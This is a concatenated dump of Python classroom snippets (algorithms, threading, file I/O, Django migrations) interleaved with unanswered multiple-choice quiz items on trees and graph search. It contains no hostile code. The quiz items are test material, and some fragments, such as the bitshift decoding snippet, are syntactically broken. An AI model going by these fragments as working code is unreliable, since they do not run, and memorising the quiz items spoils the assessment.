# output.md

---

---

````py
def knapSack01(W, wt, profit, n):
    K = [[0 for x in range(W + 1)] for x in range(n + 1)]

    # Bottom Up Tabulation
    for i in range(n + 1):
        for w in range(W + 1):
            if i == 0 or w == 0:
                K[i][w] = 0
            elif wt[i - 1] <= w:
                K[i][w] = max(profit[i - 1] + K[i - 1][w - wt[i - 1]], K[i - 1][w])
            else:
                K[i][w] = K[i - 1][w]
    return K[n][W]


# Driver Program
profit = [100, 20, 60, 40]
wt = [3, 2, 4, 1]
W = 5
n = len(profit)
print(knapSack01(W, wt, profit, n))

# lets talk about bitshifting

LDI = 0b10000010

bob = LDI >> 6
bob == 0b00000010
add_to_pc = bob + 1

FETCH
IR = 0b10000010

DECODE
add_to_pc = (IR >> 6) + 1

if IR == LDI:
    # do the ldi thing
elif IR == ADD:
    #do the add thing

cpu.pc += add_to_pc

# Generated by Django 2.1.4 on 2018-12-07 15:46

from django.db import migrations, models
import uuid


class Migration(migrations.Migration):

    initial = True

    dependencies = []

    operations = [
        migrations.CreateModel(
            name="Note",
            fields=[
                (
                    "id",
                    models.UUIDField(
                        default=uuid.uuid4,
                        editable=False,
                        primary_key=True,
                        serialize=False,
                    ),
                ),
                ("title", models.CharField(max_length=200)),
                ("content", models.TextField(blank=True)),
            ],
        )
    ]

# Generated by Django 2.1.4 on 2018-12-07 16:10

from django.db import migrations, models
import django.utils.timezone


class Migration(migrations.Migration):

    dependencies = [("notes", "0001_initial")]

    operations = [
        migrations.AddField(
            model_name="note",
            name="created_at",
            field=models.DateTimeField(
                auto_now_add=True, default=django.utils.timezone.now
            ),
            preserve_default=False,
        ),
        migrations.AddField(
            model_name="note",
            name="last_modified",
            field=models.DateTimeField(auto_now=True),
        ),
    ]

# lets talk about classes

# holds data
# methods to act upon that data

# class called Vec2
# hold x and y as integers
# constructor that can take in x and y

# class Vec2 {
#     constructor(x, y) {
#         this.x = x;
#          this.y = y;
#     }
# }

# v = new Vec2(12, 23);

# this keyword === self keyword

# Encapsulation / Data Hiding
# __ method == Private
# _ method == Protected
#   method == Public


class Vec2:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def __my_thing__(self, name):
        print(f"My name is {name}: ({self.x}, {self.y})")

    def call_my_thing(self, name):
        self.__my_thing__(name)


# l = []
# l.__add__()

# l +
v = Vec2(12, 23)

v.call_my_thing("Bob")
v.__my_thing__("Dave")

# %%
import math

# %%
radius = 3
area = math.pi * radius * radius
print(f"The area of the circle is {area:.3f} ft\u00b2")

# This is a comment

# lets print a string
# console.log("Hello, CSPT13!", "Some other text", "and theres more...")
# print("Hello, CSPT13!", "Some other text", "and theres more...")
# print("Hello, CSPT13!", "Some other text", "and theres more...")
# print("Hello")
# variables
# label = value
# let const var (js)
# int bool short (c)


first_name = "Tom"
# print("Hello CSPT13 and", first_name)
# num = 23.87

# # f strings
# print(f"This is a name: ({first_name})")
my_string = "    this is a string tom    "
# print(my_string)

# print(my_string.strip())
# print(len(my_string))
# print(len(my_string.strip()))


print(
    f"        Hello CSPT13 and           {len('this is a test')}     {first_name}.......".strip()
)
# print("something on a new line")

# first_name

# Passing by value Vs passing by Ref
import time
import statistics

# printf
# % is an unamed variable
# imagine we gave them names
# the first one was A and the second was B
# A = 3.45
# B = 4.675
print("%.2f   A   %.3f" % (3.45454545, 4.67564))

x = 5
y = 7

a = "5"
b = "7"
"57"
print(str(x).__add__(y))


# define a doubling function that passes args by value
# 2352352 #
# a = 3
# b =>>>>  @23423542 # [1, 2, 3]
# b = 23423542


def mult2(x):
    return x * 2


# define a doubling function that passes args by reference
def mult2_list(l):
    for i in range(len(l)):
        l[i] *= 2


# # try out the functions
a = 12
a = 34
b = 12

new_number = mult2(a)
print(new_number)

lst = [2, 4, 6, 8]  # mutable
mult2_list(lst)

for num in lst:
    print(num)

# lets talk about bitshifting

LDI = 0b10000010
ADD = 0b00000000
# 000000AA
bob = LDI >> 6
bob == 0b00000010 => 2
add_to_pc = bob + 1

# FETCH
IR = 0b10000010

# DECODE
add_to_pc = (IR >> 6) + 1

if IR == LDI:
    # do the ldi thing
    pass
elif IR == ADD:
    #do the add thing
    pass

cpu.pc += add_to_pc
import threading

##### Example 1 #####


def func():
    for _ in range(50):
        # if _ == 45:
        #   print("exiting at 45")
        #   return
        print("Me first!")


thread = threading.Thread(target=func)
thread.start()

for _ in range(50):
    print("No, me, Pick me!")


##### Example 2 #####
# from random import randint
# from time import sleep


def sleepy(s):
    print(f"Hello, {s}!")
    sleep_time = randint(0, 3)
    print(f"{s} is sleeping for {sleep_time} seconds")
    sleep(sleep_time)  # enters the thread wait state
    print(f"Good-bye, {s}!")


# thread1 = threading.Thread(target=sleepy, args=("Judy",))
# thread2 = threading.Thread(target=sleepy, args=("Petra",))
# thread1 = threading.Thread(target=sleepy, daemon=True, args=("Judy",))
# thread2 = threading.Thread(target=sleepy, daemon=True, args=("Petra",))
# thread1.start()
# thread2.start()

# print("All threads started.")
# thread1.join()
# thread2.join()
# print("Done with this")

# Given an integer n, return any array containing n unique integers such that they add up to 0.

# Example 1:  Input: n = 5   |   Output: [-7,-1,1,3,4]
# Explanation: These arrays also are accepted [-5,-1,1,2,3] , [-3,-1,2,-2,4].
# Example 2:  Input: n = 3   |   Output: [-1,0,1]
# Example 3:  Input: n = 1   |   Output: [0]

# Constraints:  1 <= n <= 1000

# time complexity:  O(1 or n)
# space complexity:  O(1)


def sumZero(self, n: int):
    """
    :type n: int
    :rtype: List[int]
    """
    # time complexity: O(1); create one range of digits
    # space complexity:  O(1); one unit of space

    # What's going on here?  Let's say n = 5.
    # Return a range of numbers which starts at 1-5, ends at 5, steps every 2
    # So that means it starts at -4, ends at 5, steps every 2
    # And it would return:  [-4, -2, 0, 2, 4]

    return range(1 - n, n, 2)

# Basics of Python
# - single, double and triple quotes
# - shortcut for code comment (Mac: command+/ or Windows: control+/)
# - printing variables
# - None

print("Hello, World")
print("It's raining!")
print(
    """
Welcome to Python
Have a great day!!!```


```py
)

a = None
print(a)

# in this file we will read in a file and print the lines
with open("somefile.abc") as f:
    for line in f:
        print(line)

# Lists
# - declaration & length
# - accessing items
# - sorting
# - sum, min, max

empty = []
print(empty)

friends = ["Sammy", "Jo", "Will", "Sara", "James", "Mike"]
print(friends)

print(friends[0])
# print(friends[15])
print(friends[-1])
print(friends[1:-1])
print(friends[-1:])
print(friends[1::2])
print(friends[::2])
# print(list_name[inclusive_start:exclusive_end:step_value])

# print(friends.length)
print(len(friends))

from collections import deque


def person_is_seller(name):
    return name[-1] == "m"


graph = {}
graph["you"] = ["alice", "bob", "claire"]
graph["bob"] = ["anuj", "peggy"]
graph["alice"] = ["peggy"]
graph["claire"] = ["thom", "jonny"]
graph["anuj"] = []
graph["peggy"] = []
graph["thom"] = []
graph["jonny"] = []


def search(name):
    search_queue = deque()
    search_queue += graph[name]
    # This is how you keep track of which people you've searched before.
    searched = set()
    while search_queue:
        person = search_queue.popleft()
        # Only search this person if you haven't already searched them.
        if person not in searched:
            if person_is_seller(person):
                print(person + " is a mango seller!")
                return True
            else:
                search_queue += graph[person]
                # Marks this person as searched
                searched.add(person)
    return False


search("you")

def countdown(i):
    # base case
    if i <= 0:
        return 0
    # recursive case
    else:
        print(i)
        return countdown(i - 1)


countdown(5)
````

```py

Please view images part I and II for the question

and then the choose an answer from the images A, B, C, or D

Answer is:
```

```py

```

```py

Which of the following statements is true?

A - All trees are graphs, but not all graphs are trees
B - Only some tress are graphs, but no graphs are trees
C - All graphs are trees, but not all trees are graphs


answer is:


```

```py

```

```py
How can you compute the total number of noded in a "perfect" binary tree if you know the height?


A - 2^h - 1 where h is the height of the binary tree
B - log_2(h + 1 ) where h is the height of the binary tree
C - 2^h + 1 where h is the height of the binary tree
D - h^2 - 1 where h is the height of the binary tree


answer is :


```

```py

```

```py

What type of search usually returns the shortest path from the starting vertex to the target vertex once the targe is found?

A - depth-first search
B - breadth-first search
C - greedy best-first search


answer is:



```

```py

```

```py

What are the two primary categories for tree traversals?

A - 1- Depth-First
  2- Breadth-First

B - 1- Height-First
  2- Width-First

C - 1- Level-First
  2- Branch-First

D - 1- Leaf-First
  2- Branch-First



  answer is :



```

```py

def divides_self(num):
    # TODO
    # PLAN
    # Loop through digits in the number
    #   - Use % to get the rightmost digit
    #   - Use / to discard the rightmost digit
    #   - Return false if dividing by a digit leads to a remainder
    #   OR if we are trying to divide by 0

    # Return true if the loop exits (all numbers divided evenly)

    # set a temp value variable to the number
    # while value is not zero
    # extract the digit bt moding our value by 10
    # check if the digit is zero, or if num mod the digit is not zero
    # return False

    # also divide our value by 10 to make sure we do not get an infinite loop :)

    # return True
    pass


print(divides_self(128))  # → true
print(divides_self(12))  # → true
print(divides_self(120))  # → false

# in this file we will read in a file and print the lines
import sys

with open("somefile.abc") as f:
    for line in f:
        print(line)

if word_a[i] == word_b[j]:
    # The letters match.
    cell[i][j] = cell[i - 1][j - 1] + 1
else:
    # The letters don't match.
    cell[i][j] = max(cell[i - 1][j], cell[i][j - 1])

# lets import what we need and start working on a REPL
from store import Store
from data_for_store import cats


my_store = Store(
    "Bobs Emporium", [cats["legs"], cats["fruit"], cats["special"], cats["bats"]]
)

print(my_store)
# print(repr(my_store))
selection = 0
while selection != len(my_store.categories) + 1:

    selection = input("Please select the number of a department. ")

    try:

        selection = int(selection)
        if selection == len(my_store.categories) + 1:
            print(f"Thanks for shopping at {my_store.name}")
        elif selection > 0 and selection <= len(my_store.categories):
            print(my_store.categories[selection - 1])
        else:
            print("Please select a valid number")

    except ValueError:
        print("Please enter your choice as a number.")

    # print(f"The user selected {selection}")

# Finds the smallest value in an array
def findSmallest(arr):
    # Stores the smallest value
    smallest = arr[0]
    # Stores the index of the smallest value
    smallest_index = 0
    for i in range(1, len(arr)):
        if arr[i] < smallest:
            smallest_index = i
            smallest = arr[i]
    return smallest_index


# Sort array
def selectionSort(arr):
    newArr = []
    for i in range(len(arr)):
        # Finds the smallest element in the array and adds it to the new array
        smallest = findSmallest(arr)
        newArr.append(arr.pop(smallest))
    return newArr


print(selectionSort([5, 3, 6, 2, 10]))

# You pass an array in, and it gets converted to a set.
states_needed = set(["mt", "wa", "or", "id", "nv", "ut", "ca", "az"])

stations = {}
stations["kone"] = set(["id", "nv", "ut"])
stations["ktwo"] = set(["wa", "id", "mt"])
stations["kthree"] = set(["or", "nv", "ca"])
stations["kfour"] = set(["nv", "ut"])
stations["kfive"] = set(["ca", "az"])

final_stations = set()

while states_needed:
    best_station = None
    states_covered = set()
    for station, states_for_station in stations.items():
        covered = states_needed & states_for_station
        if len(covered) > len(states_covered):
            best_station = station
            states_covered = covered

    states_needed -= states_covered
    final_stations.add(best_station)

print(final_stations)

import time


def sum_to_n(n):
    # Record start time
    start = time.time()

    # Execute code
    total = 0
    for num in range(n + 1):
        total += num

    # Record end time
    end = time.time()

    # Return total and time
    return total, end - start


def arithmetic_sum(n):
    start = time.time()
    total = n * (n + 1) // 2
    end = time.time()

    # Return total and time
    return total, end - start


output_template = "{}({}) = {:10d} ({:8.7f} seconds)"

# for i in range(1, 5):
#     print(output_template.format('sum_to_n', i * 1000000, *sum_to_n(i * 1000000)))
# print('-'*80)
for i in range(1, 5):
    print(
        output_template.format(
            "arithmetic_sum", i * 1000000, *arithmetic_sum(i * 1000000)
        )
    )

import threading


def func():
    for _ in range(100):
        print("In the thread.")


thread = threading.Thread(target=func)
thread.start()

for _ in range(100):
    print("In the main program.")

import threading
from time import sleep


class ValueHolder:
    def __init__(self):
        self._value = 0
        self._lock = threading.Lock()

    def increment(self):
        # BEGIN CRITICAL SECTION
        with self._lock:
            v = self._value
            v = v + 1
            sleep(0.1)
            self._value = v
        # END CRITICAL SECTION

    @property
    def value(self):
        return self._value


vh = ValueHolder()

thread1 = threading.Thread(target=vh.increment, daemon=True)
thread2 = threading.Thread(target=vh.increment, daemon=True)

thread1.start()
thread2.start()

print("Threads all started.")
thread1.join()
thread2.join()
print(vh.value)
print("Done with this.")

# Arithmetic in Python
# - numeric types: integer and float
# - add, subtract, multiply => notice numeric types of results
# - powers, division
# - integer division & modulo teaming up
# - warning: watch for rounding errors

x = 25  # integer
y = 17.0  # float

# print(x)
# print(y)

# print(x + y)
# print(x - y)

# print(x * y)
# print(x / y)

# print(x // y) # integer division
# print(x % y) # modulo

# print(f'The result is {int(x // y)} remainder {int(x % y)}')

# print(x ** 2)
# print(y ** 2)

# x = 25
# y = 17.6

# # rounding errors due to floats
# # we can cast to int, round(num, digits), etc.
# print(x * y)
# print(int(x * y))
# print(round(x * y, 2))

# Casting will truncate (floor) our float
print(int(17.2))
print(int(17.9))

# argv and argc take in command line args
import sys

if len(sys.argv) != 2:
    print("usage: 02-fileio02.py <filename>")
    sys.exit(1)


try:
    with open(sys.argv[1]) as f:
        for line in f:
            print(line)
except FileNotFoundError:
    print(f"{sys.argv[0]}: {sys.argv[1]} not found")

# Lists
# - declaration & length
# - accessing items
# - mutable with append, remove
# - sorting
# - sum, min, max

# supplies = ['crayons', 'pencils', 'paper', 'Kleenex', 'eraser']
# print(supplies)

# supplies.append('markers')
# print(supplies)

# supplies.remove('crayons')
# print(supplies)

# supplies.sort()
# print(supplies)

# supplies.sort(key=str.lower)
# print(supplies)

colors = ["red", "orange", "blue", "pink"]
alphabetical = sorted(colors)
print(colors)
print(alphabetical)

alphabetical = sorted(colors, reverse=True)
print(alphabetical)

reverseColors = reversed(colors)
reverseAlpha = reversed(alphabetical)
print(reverseColors)
print(reverseAlpha)
print(list(reverseColors))
print(list(reverseAlpha))

def do_something(n):
    a = 5
    b = 6
    c = 10
    for i in range(n):
        for j in range(n):
            x = i * i
            y = j * j
            z = i * j
    for k in range(n):
        w = a * k + 45
        v = b * b
    d = 33


# f(n) = 3 + 3n^2 + 2n + 1 = 3n^2 + 2n + 4 = O(n^2)

voted = {}


def check_voter(name):
    if voted.get(name):
        print("kick them out!")
    else:
        voted[name] = True
        print("let them vote!")


check_voter("tom")
check_voter("mike")
check_voter("mike")
```

```py
Choose the answer that best describes the difference between a directed and undirected graph.

A - Directed graph can only be unidirectional but undirected graphs are always bidirectional

B - Directed graphs best represent relationships that cna be described as "mutual exchanges", while undirected graphs bes represent relationships that cna be described as "one way"

C - Directed graphs and undirected graphs are only different if they have edge weights that are associated with them

D - Directed graphs best represent relationships that can be described as "one way", while undirected graphs best represent relationships that can be described as "mutual exchanges"


answer is:


```

```py

```

```py

In a BFS, we track what neighbors still need to be explored. In BFS, this is done in a first in, first out order.

What data structure works best for keeping track of these unvisited neighbors?


A - Binary Tree
B - Binary Search Tree
C - Stack
D - Queue


answer is:






```

```py

```

```py

What is one of the primary weaknesses of the binary search tree as a data structure?

A - insertions and deletions are slower than a sorted array
B - They are unsorted by default
C - the performance degrades if it becomes unbalanced
D - it has slower lookups than a sorted array



the answer is:

```

```py

```

```py

Select the three different types of depth-first traversals:

A - Preorder
B - Inorder
C - Breadth-First
D - Postorder
E - Level Order
F - None of the above



Answer is :


```

```py

```

````py
Python is a strongly-typed language under the hood, which means
that it the types of values matter, especially when we're trying
to perform operations on them.

Note that if you try running the following code without making any
changes, you'll get a TypeError saying you can't perform an operation
on a string and an integer.```


```py

x = 5
y = "7"

# Write a print statement that combines x + y into the integer value 12
print(x + int(y))


# Write a print statement that combines x + y into the string value 57
print(str(x) + y)

class Deque(object):
    def __init__(self):
        self._items = []

    def is_empty(self):
        return self._items == []

    def add_front(self, item):
        self._items.append(item)

    def add_rear(self, item):
        self._items.insert(0, item)

    def remove_front(self):
        return self._items.pop()

    def remove_rear(self):
        return self._items.pop(0)

    @property
    def size(self):
        return len(self._items)


deque = Deque()
deque.add_front("John")
deque.add_front("Mike")
deque.add_front("Slim")
deque.add_rear("Joe")
deque.add_rear("Harry")
deque.add_rear("Harrison")

print(deque.size)
print(deque.remove_front())
print(deque.remove_front())
print(deque.remove_front())
print(deque.remove_front())
print(deque.remove_front())
print(deque.remove_front())

# argv and argc take in command line args
import sys

if len(sys.argv) != 2:
    print("usage: 02_fileio2.py filename")

try:
    # print(sys.argv[1])
    with open("somefile.abc") as f:
        for line in f:
            print(line)

except:
    print("can not find it!")

import requests
import re

# get url
url = input("Enter a URL (include `http://`): ")

# connect to the url
website = requests.get(url)

# read html
html = website.text

# use re.findall to grab all the links
links = re.findall('"((http|ftp)s?://.*?)"', html)

# output links
for link in links:
    print(link[0])

def greet2(name):
    print("how are you, ", name, "?")


def bye():
    print("ok bye!")


def greet(name):
    print("hello, ", name, "!")
    greet2(name)
    print("getting ready to say bye...")
    bye()


greet("adit")

# lets make a guessing game
# set a value
# take in some input from a player
# check it against a value
# if they are the same print player wins
# if they are different print guess again
# and loop

number = 45
playing = True
# REPL
while playing:  # LOOP
    user_guess = int(input(" Guess the number I am thinking of >>> "))  # READ

    # EVAL
    if number == user_guess:
        print("You Win!")  # PRINT
        playing = False
    else:
        print("Not correct, guess again!")

# Unlike with a stack, the performance implication of using a Python list as a queue is
# significant. The implementation shown below uses insert(0, item) to enqueue a new item,
# which will be an O(n) operation.

# many Python programmers will use the standard library’s collections.deque class
# to achieve O(1)O(1) enqueues and dequeues.


class Queue(object):
    def __init__(self):
        self._items = []

    def is_empty(self):
        return self._items == []

    def enqueue(self, item):
        self._items.insert(0, item)

    def dequeue(self):
        return self._items.pop()

    def size(self):
        return len(self._items)


# queue = Queue()
# queue.enqueue('1')
# queue.enqueue('2')
# queue.enqueue('3')
# queue.enqueue('4')
# print(queue.is_empty())
# print(queue.size())
# print(queue.dequeue())
# print(queue.dequeue())
# print(queue.dequeue())

# lets make a guessing game
# set a value
# take in some input from a player
# check it against a value
# if they are the same print player wins
# if they are different print guess again
# and loop


# what is a REPL?
# how can we make this game replayable?
import random

value = random.randint(1, 100)
guess = None
while value != guess:
    guess = input("Guess a number between 1 and 100! ")
    guess = int(guess)

    if value == guess:
        print("Great guess. You Win!")
    else:
        print("Not correct. Guess again!")

import threading
from random import randint
from time import sleep


def func(s):
    print(f"Hello, {s}!")
    sleep_time = randint(0, 3)
    print(f"Sleeping for {sleep_time} seconds")
    sleep(sleep_time)
    print(f"Good-bye, {s}!")


thread1 = threading.Thread(target=func, args=("Judy",))
thread2 = threading.Thread(target=func, args=("Petra",))

thread1.start()
thread2.start()
print("Threads all started.")

import threading
from time import sleep

lock1 = threading.Lock()
lock2 = threading.Lock()


def func1():
    with lock1:
        sleep(0.1)
        with lock2:
            print("func1")


def func2():
    with lock2:
        sleep(0.1)
        with lock1:
            print("func2")


thread1 = threading.Thread(target=func1)
thread2 = threading.Thread(target=func2)
thread1.start()
thread2.start()

# Avoid this situation by using shared locks in the same order!!!

# argv and argc take in command line args
import sys

if len(sys.argv) != 2:
    print("usage: 03-fileio02.py filename")
    sys.exit(1)
try:
    with open(sys.argv[1]) as f:
        for line in f:
            print(line)
except FileNotFoundError:
    print(f"{sys.argv[0]}: {sys.argv[1]} not found")
    sys.exit(2)

# lets parse some numbers
import sys

if len(sys.argv) != 2:
    print("usage: 02-fileio02.py <filename>")
    sys.exit(1)


try:
    with open(sys.argv[1]) as f:
        for line in f:
            # deal with comments
            # split before and after any comment symbol '#'
            comment_split = line.split("#")

            # convert the pre-comment portion (to the left) from binary to a value
            # extract the first part of the split to a number variable
            # and trim whitespace
            num = comment_split[0].strip()

            # ignore blank lines / comment only lines
            if len(num) == 0:
                continue

            # set the number to an integer of base 2
            value = int(num, 2)
            # print the value in binary and in decimal
            print(f"{value:08b}: {value:d}")

except FileNotFoundError:
    print(f"{sys.argv[0]}: {sys.argv[1]} not found")
    sys.exit(2)

# lets parse some numbers
# argv and argc take in command line args
import sys

import sys

if len(sys.argv) != 2:
    print("usage: 02-fileio.2.py <filename>")
    sys.exit(1)
try:
    with open(sys.argv[1]) as f:
        for line in f:
            # split the comment out
            comment_split = line.split("#")

            num = comment_split[0].strip()

            if num == "":
                continue

            i_num = int(num, 2)

            print(f"{i_num:08b}: {i_num:d}")
except FileNotFoundError:
    print("file not found!!!")
    sys.exit(2)

# Simple Input and Formatted Printing
# - Prompt for input()
# - Formatted printing 4 ways

name = input("What is your name?\n")

print("Hi, " + name + ".")
print("Hi, %s." % name)
print("Hi, {fname} {lname}.".format(lname="Doe", fname="John"))
print(f"Hi, {name}.")

# Lists
# - declaration & length
# - accessing items
# - mutable with append, remove
# - sorting
# - sum, min, max

scores = [159, 210, 188, 76]
print(scores)

teamScore = sum(scores)
print(teamScore)

highestScore = max(scores)
print(highestScore)

lowestScore = min(scores)
print(lowestScore)

averageScores = sum(scores) / len(scores)
print(averageScores)

rankedScores = sorted(scores, reverse=True)
print(rankedScores)
````

````py
 Given a string, find the length of the longest substring without repeating characters.

 Examples:

 Given "abcabcbb", the answer is "abc", which the length is 3.

 Given "bbbbb", the answer is "b", with the length of 1.

 Given "pwwkew", the answer is "wke", with the length of 3. Note that the answer must be a substring, "pwke" is a subsequence and not a substring.```


```py


class Solution(object):
    def lengthOfLongestSubstring(self, s):
        """
        :type s: str
        :rtype: int
        """
        mapSet = {}
        start, result = 0, 0

        for end in range(len(s)):
            if s[end] in mapSet:
                start = max(mapSet[s[end]], start)
            result = max(result, end - start + 1)
            mapSet[s[end]] = end + 1

        return result
````

```py

What does the phrase "in-order successor" mean when we are talking about a node in a binary search tree?

A - the node that has the next lowest value
B - the node that has the maximum value
C - the node that has the minimuin value
D - the node that has the next highest value


answer is :


```

```py

```

```py

Select the correct ordering of steps for an inorder depth-first traversal:

A - 1. Visit node
    2. Go to the right subtree
    3. got to the left subtree

B - 1. Go to the right subtree
    2. Go to the left subtree
    3. Visit node

C - 1. Go to the left subtree
    2. Go to the right subtree
    3. Visit node

D - 1. Go to the right subtree
    2. Visit node
    3. Go to the left subtree

E - 1. Go to the left subtree
    2. Visit node
    3. Go to the right subtree

F - 1. Visit node
    2. Go to the left subtree
    3. Go to the right subtree




    answer is :



```

```py

```

```py

Which search method is preferred "IF" we want to ensure that we visit every node in the graph?

A - Breadth-First Search
B - Depth-First Search
C - Best-First Search


answer is :



```

```py

import threading
from time import sleep
from random import randint


def func(s):
    print(f"Hello, {s}!")
    sleep_time = randint(0, 3)
    print(f"Sleeping for {sleep_time} seconds")
    sleep(sleep_time)
    print(f"Good-bye, {s}!")


thread1 = threading.Thread(target=func, args=("Judy",), daemon=True)
thread2 = threading.Thread(target=func, args=("Petra",), daemon=True)

thread1.start()
thread2.start()
print("Threads all started.")
sleep(1)
print("Done with this.")

# lets parse some numbers
# argv and argc take in command line args
# in this file we will read in a file and print the lines
import sys

if len(sys.argv) != 2:
    print("usage: 02_fileio2.py filename")

try:
    # print(sys.argv[1])
    with open("somefile.abc") as f:
        for line in f:
            comment_split = line.split("#")
            n = comment_split[0].strip()

            if n == "":
                continue

            x = int(n, 2)
            print(f"{x:08b}: {x:d}")

except:
    print("can not find it!")
```

````py
In this exercise, you'll be playing around with the sys module,
which allows you to access many system specific variables and
methods, and the os module, which gives you access to lower-
level operating system functionality.```


```py

import sys

# See docs for the sys module: https://docs.python.org/3.7/library/sys.html

# Print out the command line arguments in sys.argv, one per line:
for arg in sys.argv:
    print(arg)

# Print out the OS platform you're using:
print(sys.platform)

# Print out the version of Python you're using:
print(sys.version)


import os

# See the docs for the OS module: https://docs.python.org/3.7/library/os.html

# Print the current process ID
print(os.getpid())

# Print the current working directory (cwd):
print(os.getcwd())

# Print out your machine's login name
print(os.getlogin())

# A palindrome is a string that reads the same forward and backward:
#   - radar, toot, madam, racecar

from collections import deque


def is_palindrome(characters):
    char_queue = deque(characters)

    while len(char_queue) > 1:
        first = char_queue.popleft()
        last = char_queue.pop()
        if first != last:
            return False

    return True


print(is_palindrome("lsdkjfskf"))  # => False
print(is_palindrome("radar"))  # => True

import twitter


TWITTER_CONSUMER_KEY = "XXX"
TWITTER_CONSUMER_SECRET = "XXX"
TWITTER_ACCESS_TOKEN_KEY = "XXX"
TWITTER_ACCESS_TOKEN_SECRET = "XXX"

twitter_api = twitter.Api(
    consumer_key=TWITTER_CONSUMER_KEY,
    consumer_secret=TWITTER_CONSUMER_SECRET,
    access_token_key=TWITTER_ACCESS_TOKEN_KEY,
    access_token_secret=TWITTER_ACCESS_TOKEN_SECRET,
)

if __name__ == "__main__":
    follower_ids = twitter_api.GetFollowerIDs()
    following_ids = twitter_api.GetFriendIDs()
    zombie_follows = [
        following_id
        for following_id in following_ids
        if following_id not in follower_ids
    ]

    confirm = raw_input(
        "Are you sure you want to unfollow {0} tweeps [y|n]? ".format(
            (len(zombie_follows))
        )
    )
    if confirm.lower() == "y":
        for id in zombie_follows:
            user = twitter_api.DestroyFriendship(user_id=id)
            print("Unfollowed {0}".format(user.screen_name))

def adjacentElementsProduct(inputArray):
    max = inputArray[0] * inputArray[1]
    for i in range(len(inputArray) - 1):
        if inputArray[i] * inputArray[i + 1] > max:
            max = inputArray[i] * inputArray[i + 1]
    return max

# Duck Typing
# - len()
# - try ... except

a = False
try:
    print(len(a))
except:
    print(f"{a} has no length")

# lets parse some numbers
# argv and argc take in command line args
import sys

if len(sys.argv) != 2:
    print("usage: 03-fileio02.py filename")
    sys.exit(1)
try:
    with open(sys.argv[1]) as f:
        for line in f:
            # split line before and after comment symbol
            comment_split = line.split("#")

            # extract our number
            num = comment_split[0].strip()  # trim whitespace

            if num == "":
                continue  # ignore blank lines

            # convert our binary string to a number
            x = int(num, 2)

            # print the x in bin and dec
            print(f"{x:08b}: {x:d}")

except FileNotFoundError:
    print(f"{sys.argv[0]}: {sys.argv[1]} not found")
    sys.exit(2)

def adjacentElementsProduct(inputArray):
    max = inputArray[0] * inputArray[1]
    for i in range(len(inputArray) - 1):
        if inputArray[i] * inputArray[i + 1] > max:
            max = inputArray[i] * inputArray[i + 1]
    return max
````

```py
You are given a binary tree and you need to write a function that can determine if it is height-balanced.

A height-balanced tree can be defined as a binary tree in which the left and right subtrees of every node differ in height by a maximum of 1.

Example 1:
Given the following tree [5,10,25,None,None,12,3]:

    5
   / \
 10  25
    /  \
   12   3
return True.

Example 2:
Given the following tree [5,6,6,7,7,None,None,8,8]:

       5
      / \
     6   6
    / \
   7   7
  / \
 8   8
return False.

[execution time limit] 4 seconds (py3)

[input] tree.integer root

[output] boolean
```

```py
#
# Binary trees are already defined with this interface:
# class Tree(object):
#   def __init__(self, x):
#     self.value = x
#     self.left = None
#     self.right = None
def balancedBinaryTree(root):



```

```py

Select the correct ordering of steps for a preorder depth-first traversal


A - 1. Visit node
    2. Go to the right subtree
    3. got to the left subtree

B - 1. Go to the right subtree
    2. Go to the left subtree
    3. Visit node

C - 1. Go to the left subtree
    2. Go to the right subtree
    3. Visit node

D - 1. Go to the right subtree
    2. Visit node
    3. Go to the left subtree

E - 1. Go to the left subtree
    2. Visit node
    3. Go to the right subtree

F - 1. Visit node
    2. Go to the left subtree
    3. Go to the right subtree




    answer is :

```

```py

import threading
from time import sleep
from random import randint


def func(s):
    print(f"Hello, {s}!")
    sleep_time = randint(0, 3)
    print(f"Sleeping for {sleep_time} seconds")
    sleep(sleep_time)
    print(f"Good-bye, {s}!")


thread1 = threading.Thread(target=func, args=("Judy",), daemon=True)
thread2 = threading.Thread(target=func, args=("Petra",), daemon=True)

thread1.start()
thread2.start()
print("Threads all started.")
thread1.join()
thread2.join()
print("Done with this.")
```

````py
Python provides a number of ways to perform printing. Research
how to print using the printf operator, the `format` string
method, and by using f-strings.```


```py

x = 10
y = 2.24552
z = "I like turtles!"

# Using the printf operator (%), print the following feeding in the values of x,
# y, and z:
# x is 10, y is 2.25, z is "I like turtles!"
print('x is %d, y is %.2f, z is "%s"' % (x, y, z))

# Use the 'format' string method to print the same thing
print('x is {}, y is {:.2f}, z is "{}"'.format(x, y, z))

# Finally, print the same thing using an f-string
print(f"x is {x}, y is {y:.2f}, z is {z}")

def max_(lst):
    if len(lst) == 0:
        return None
    if len(lst) == 1:
        return lst[0]
    else:
        sub_max = max_(lst[1:])
        return lst[0] if lst[0] > sub_max else sub_max

import os
import glob

os.chdir("/Users/mikeherman/repos/bugs/se-platform/se/core/permissions")
for file in glob.glob("*.json"):
    file_name = os.path.splitext(file)[0]
    extension = os.path.splitext(file)[1]
    new_file_name = file_name[:-6] + extension
    try:
        os.rename(file, new_file_name)
    except OSError as e:
        print(e)
    else:
        print("Renamed {} to {}".format(file, new_file_name))

# Two common operations are indexing and assigning to an index position.
# In lists, values are assigned to and retrieved from specific, known memory locations.
# No matter how large the list is, index lookup and assignment take a constant amount of
# time and are thus O(1)

#### Note: Many of these are O(n) due to shifting that is require after mutation
# index[]         - O(1)
# index assignment - O(1)
# append         - O(1)
# pop()             - O(1)
# pop(i)         - O(n)
# insert(i, item) - O(n)
# del operator   - O(n)
# iteration         - O(n)
# contains ( in ) - O(n)
# get slice[x:y] - O(k) -  where k is the size of the slice
# del slice         - O(n)
# reverse         - O(n)
# concatenate     - O(k) -  where k is the size of the concatenated list
# sort             - O(nlog(n))
# multiply         - O(nk) - where k is the length of the list, must be appended k(n-1) times

#### Dictionaries - Average Case
#  Getting/Setting   - O(1)
#  Contains          - O(1)
#  Iterating/Copying - O(n) - n key/value pairs must be copied

# More complex try blocks
import sys

a = "False"
b = 6
c = 2
try:
    print(len(a))
    print(b / c)
    print(a[47])
except TypeError:
    print(f"{a} has no length")
except ZeroDivisionError as err:
    print(f"Cannot divide by zero! Error: {err}")
except:
    print(f"Uh oh, unknown error: {sys.exc_info()}")
else:
    print("No errors! Nice!")
finally:
    print("Thanks for using the program!")

# Arithmetic with Strings

a = "a"
b = "b"
an = "an"

print(b + an)
print(b + a * 7)
print(b + an * 2 + a)

print("$1" + ",000" * 3)

# Tuples
# - declare
# - cannot append, remove or sort in place
# - sorted()
# - min, max, sum, len
# - empty and single item tuples
# - returning tuples from functions

a = 1, 2, 3
b = ("a", "b", "c")

